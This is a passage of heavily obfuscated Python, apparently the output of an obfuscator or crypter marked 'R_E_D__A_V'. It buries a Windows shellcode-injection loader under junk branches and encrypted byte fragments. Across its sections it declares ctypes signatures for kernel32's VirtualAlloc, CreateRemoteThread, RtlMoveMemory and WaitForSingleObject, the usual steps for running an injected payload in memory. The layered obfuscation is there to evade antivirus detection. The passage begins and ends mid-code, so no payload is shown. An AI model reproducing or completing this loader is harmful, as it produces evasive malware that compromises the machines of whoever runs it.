        __4077463145705 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '149' == '1911':
        case True:
            raise MemoryError([True])
        case False:
            _1519 = [[True], [False]]
            R_E_D__A_V______(['_1911'])
    raise MemoryError([True])
except MemoryError as _814:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _151: _151 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _106 = [[(lambda : (lambda _1215: _1215 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _194: _194 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _510: _510 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1219:
        try:
            raise MemoryError(__4077463145705)
        except MemoryError as __6649426330911:
            if __6649426330911.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.restype = wt.LPVOID
            if __6649426330911.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __8004474045142 = (lambda : R_E_D__A_V(b"R_E_D__A_V__h\x19w\xa9\x02'"))()
            if __6649426330911.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6463141781121 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x84\x9d\xcc\xa5\xdc\x92'))()
try:
    match '1812' == '913':
        case True:
            raise MemoryError([True])
        case False:
            _915 = [[True], [False]]
            R_E_D__A_V______(['_129'])
    raise MemoryError([True])
except MemoryError as _1016:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _188: _188 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1417 = [[(lambda : (lambda _151: _151 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _119: _119 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _34: _34 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _411:
        __3840187126791 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '418' == '14':
        case True:
            raise MemoryError([True])
        case False:
            _105 = [[True], [False]]
            R_E_D__A_V______(['_175'])
    raise MemoryError([True])
except MemoryError as _122:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _136: _136 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _193 = [[(lambda : (lambda _163: _163 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1013: _1013 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _19: _19 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _211:
        __3840187126791 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '133' == '412':
        case True:
            raise MemoryError([True])
        case False:
            _176 = [[True], [False]]
            R_E_D__A_V______(['_45'])
    raise MemoryError([True])
except MemoryError as _616:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1612: _1612 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1610 = [[(lambda : (lambda _142: _142 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1810: _1810 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _1011: _1011 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1817:
        try:
            raise MemoryError(__3840187126791)
        except MemoryError as __4384012525440:
            if __4384012525440.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
            if __4384012525440.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5932020451766 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xf5\n\xcb3d\x88'))()
            if __4384012525440.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2746998047377 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xb8SXZ_\xc5'))()
            if __4384012525440.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __7964968063557 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xfb/\x8e)\\\xce'))()
            if __4384012525440.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __6896690118177 = (lambda : R_E_D__A_V(b'R_E_D__A_V__e\xdc2\x8d\\\x1d'))()
            if __4384012525440.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __2891768044975 = (lambda : R_E_D__A_V(b'R_E_D__A_V__e\xfe\xc2\xe9)\x93'))()
try:
    match '75' == '39':
        case True:
            raise MemoryError([True])
        case False:
            _75 = [[True], [False]]
            R_E_D__A_V______(['_1211'])
    raise MemoryError([True])
except MemoryError as _67:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _65: _65 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _511 = [[(lambda : (lambda _1516: _1516 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1817: _1817 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _17: _17 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _512:
        __6243355396838 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '36' == '319':
        case True:
            raise MemoryError([True])
        case False:
            _84 = [[True], [False]]
            R_E_D__A_V______(['_1118'])
    raise MemoryError([True])
except MemoryError as _26:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _519: _519 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1514 = [[(lambda : (lambda _65: _65 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _193: _193 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _45: _45 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _149:
        __6243355396838 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1519' == '192':
        case True:
            raise MemoryError([True])
        case False:
            _1810 = [[True], [False]]
            R_E_D__A_V______(['_417'])
    raise MemoryError([True])
except MemoryError as _189:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _316: _316 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _410 = [[(lambda : (lambda _910: _910 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1916: _1916 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _1015: _1015 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _210:
        try:
            raise MemoryError(__6243355396838)
        except MemoryError as __8638815731633:
            if __8638815731633.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.restype = wt.HANDLE
            if __8638815731633.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7006500717038 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x0bSR\xdd\x03\xfe'))()
            if __8638815731633.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __5502193721987 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x16\xb6\xaf\x80\x89\x13'))()
try:
    match '1918' == '47':
        case True:
            raise MemoryError([True])
        case False:
            _106 = [[True], [False]]
            R_E_D__A_V______(['_64'])
    raise MemoryError([True])
except MemoryError as _1114:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _106: _106 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _191 = [[(lambda : (lambda _151: _151 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _82: _82 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _1913: _1913 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _156:
        __2792895334348 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '196' == '1012':
        case True:
            raise MemoryError([True])
        case False:
            _98 = [[True], [False]]
            R_E_D__A_V______(['_716'])
    raise MemoryError([True])
except MemoryError as _191:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _27: _27 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1815 = [[(lambda : (lambda _519: _519 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _210: _210 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _23: _23 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _158:
        __2792895334348 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '718' == '619':
        case True:
            raise MemoryError([True])
        case False:
            _37 = [[True], [False]]
            R_E_D__A_V______(['_518'])
    raise MemoryError([True])
except MemoryError as _1213:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _610: _610 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _78 = [[(lambda : (lambda _814: _814 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1114: _1114 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _137: _137 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _112:
        try:
            raise MemoryError(__2792895334348)
        except MemoryError as __5459830600956:
            if __5459830600956.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
            if __5459830600956.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2512481663844 = (lambda : R_E_D__A_V(b'R_E_D__A_V__38Yj-\xf0'))()
            if __5459830600956.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __7008619191821 = (lambda : R_E_D__A_V(b'R_E_D__A_V__}y_"\x90v'))()
            if __5459830600956.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __2627957678645 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xba\x88Jw\xa4\xb5'))()
try:
    match '916' == '512':
        case True:
            raise MemoryError([True])
        case False:
            _153 = [[True], [False]]
            R_E_D__A_V______(['_19'])
    raise MemoryError([True])
except MemoryError as _316:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742703]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _83: _83 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _716 = [[(lambda : (lambda _19: _19 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1016: _1016 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _113: _113 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _614:
        __5899495441640 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '218' == '182':
        case True:
            raise MemoryError([True])
        case False:
            _27 = [[True], [False]]
            R_E_D__A_V______(['_34'])
    raise MemoryError([True])
except MemoryError as _89:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1610: _1610 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1419 = [[(lambda : (lambda _112: _112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _34: _34 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _122: _122 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _217:
        __5899495441640 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1715' == '1819':
        case True:
            raise MemoryError([True])
        case False:
            _1214 = [[True], [False]]
            R_E_D__A_V______(['_194'])
    raise MemoryError([True])
except MemoryError as _58:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _219: _219 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _82 = [[(lambda : (lambda _89: _89 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1016: _1016 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _1113: _1113 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _417:
        try:
            raise MemoryError(__5899495441640)
        except MemoryError as __6478797391262:
            if __6478797391262.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.restype = None
            if __6478797391262.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7848934478133 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xa6\xda]K\xb4\xb0'))()
            if __6478797391262.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2406743800084 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xd0\xf1\xc1\xdb\xd5@'))()
try:
    match '1918' == '71':
        case True:
            raise MemoryError([True])
        case False:
            _811 = [[True], [False]]
            R_E_D__A_V______(['_164'])
    raise MemoryError([True])
except MemoryError as _162:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _169: _169 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _39 = [[(lambda : (lambda _86: _86 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _143: _143 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _1319: _1319 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _154:
        __7349087250059 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '115' == '1614':
        case True:
            raise MemoryError([True])
        case False:
            _79 = [[True], [False]]
            R_E_D__A_V______(['_146'])
    raise MemoryError([True])
except MemoryError as _1416:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1411: _1411 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _189 = [[(lambda : (lambda _69: _69 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _21: _21 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _19: _19 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _167:
        __7349087250059 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '29' == '1516':
        case True:
            raise MemoryError([True])
        case False:
            _518 = [[True], [False]]
            R_E_D__A_V______(['_1318'])
    raise MemoryError([True])
except MemoryError as _617:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _196: _196 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _71 = [[(lambda : (lambda _125: _125 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1912: _1912 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _1218: _1218 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _168:
        try:
            raise MemoryError(__7349087250059)
        except MemoryError as __6246712566619:
            if __6246712566619.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
            if __6246712566619.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7233689960946 = (lambda : R_E_D__A_V(b'R_E_D__A_V__p\x8dK\xa2\xd8L'))()
try:
    match '919' == '1314':
        case True:
            raise MemoryError([True])
        case False:
            _174 = [[True], [False]]
            R_E_D__A_V______(['_519'])
    raise MemoryError([True])
except MemoryError as _118:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742703]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _108: _108 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1213 = [[(lambda : (lambda _24: _24 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1218: _1218 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _47: _47 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1713:
        __4853846879248 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '162' == '116':
        case True:
            raise MemoryError([True])
        case False:
            _1013 = [[True], [False]]
            R_E_D__A_V______(['_155'])
    raise MemoryError([True])
except MemoryError as _1810:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _315: _315 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1215 = [[(lambda : (lambda _186: _186 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1117: _1117 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _165: _165 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _75:
        __4853846879248 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1416' == '152':
        case True:
            raise MemoryError([True])
        case False:
            _191 = [[True], [False]]
            R_E_D__A_V______(['_82'])
    raise MemoryError([True])
except MemoryError as _111:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742710]))))())())():
            case True:
